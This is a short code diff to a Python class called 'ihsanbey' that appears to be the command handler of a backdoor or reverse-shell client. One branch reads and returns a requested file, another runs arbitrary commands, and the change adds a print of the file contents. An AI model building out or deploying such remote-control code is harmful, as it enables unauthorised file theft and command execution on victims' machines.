@@ -65,6 +65,7 @@ class ihsanbey:
             elif command.startswith("download "):
                 the_file = " ".join(command.split(" ")[1:])
                 command_result = self.read_file(the_file)
+                print(command_result)
             else:
                 try:    
                     resultt = self.execute_command(command.encode("utf-8"))
